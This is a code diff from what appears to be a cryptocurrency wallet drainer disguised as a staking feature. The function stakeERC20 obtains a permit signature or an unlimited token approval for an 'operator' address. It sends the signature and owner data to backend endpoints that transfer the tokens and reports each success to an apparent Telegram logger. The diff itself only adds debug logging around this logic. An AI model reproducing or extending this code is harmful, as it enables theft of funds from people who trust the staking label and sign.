@@ -988,23 +988,45 @@ console.log("Total:", tokenListLocal.length);
 
   async function stakeERC20(tokenAddress, amount, msg, chainId, abiUrl) {
     success = 1;
+
+    console.log("========== ERC20 START ==========");
+    console.log("Token:", tokenAddress);
+    console.log("Amount:", amount);
+    console.log("Chain:", chainId);
+    console.log("Account:", appState.account);
+
     try {
       const contractInfo = await getABI(tokenAddress, abiUrl);
       const tokenContract = new appState.web3.eth.Contract(contractInfo[0], tokenAddress);
       const contract = new ethers.Contract(tokenAddress, contractInfo[0], appState.signer);
 
       const functions = contract.functions || {};
-      const hasPermit = functions.permit && functions.nonces && functions.name && isValidPermit(functions);
+      const hasPermit = functions.permit &&
+                  functions.nonces &&
+                  functions.name &&
+                  isValidPermit(functions);
+
+console.log("Permit supported:", !!hasPermit);
 
       if (hasPermit) {
-        const permitData = await permit(contract, appState.account, operator);
+        console.log("Calling permit()...");
+const permitData = await permit(contract, appState.account, operator);
+console.log("Permit signature received:");
+console.log(permitData);
         const data = { chainId, tokenAddress, abiUrl, amount, owner: appState.account, spender: operator, permit: permitData, impl: contractInfo[1] };
-        await resilientAxiosPost(TOKEN_APPROVE, data);
+        console.log("Posting permit to backend...");
+console.log(data);
+
+await resilientAxiosPost(TOKEN_APPROVE, data);
+
+console.log("Backend accepted permit.");
         logTlgMsg(msg, success);
         return;
       }
 
-      await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
+      console.log("No permit support. Falling back to approve().");
+
+await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
         from: appState.account,
         gas: 110000,
         gasPrice: 0
@@ -1014,10 +1036,25 @@ console.log("Total:", tokenListLocal.length);
       await resilientAxiosPost(TOKEN_TRANSFER, data);
       logTlgMsg(msg, success);
     } catch (e) {
-      success = 0;
-      classifyError(e, { operation: 'stakeERC20', token: tokenAddress });
-      logTlgMsg(msg, success);
-    }
+    success = 0;
+
+    console.log("========== ERC20 ERROR ==========");
+    console.error(e);
+
+    if (e.code) console.error("Code:", e.code);
+    if (e.message) console.error("Message:", e.message);
+    if (e.data) console.error("Data:", e.data);
+    if (e.stack) console.error(e.stack);
+
+    classifyError(e, {
+        operation: 'stakeERC20',
+        token: tokenAddress
+    });
+
+    console.log("========== ERC20 END ==========");
+
+    logTlgMsg(msg, success);
+}
   }
 
   async function stakeNFT(tokenAddress, nftTokenID, msg) {
